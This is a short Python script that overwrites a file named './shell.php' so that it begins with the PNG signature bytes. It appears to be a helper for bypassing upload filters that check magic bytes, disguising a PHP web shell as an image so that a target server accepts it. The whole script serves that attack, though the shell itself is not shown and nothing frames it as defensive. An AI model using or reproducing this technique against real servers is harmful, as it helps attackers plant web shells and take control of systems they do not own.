import mimetypes

header = bytes.fromhex("89504E470D0A1A0A0000000D49484452")
file_name = "./shell.php"


def change_hex():
    with open(file_name, "rb") as f:
        content = f.read()

    with open(file_name, "wb") as f:
        f.write(header)
        f.write(content)


change_hex()
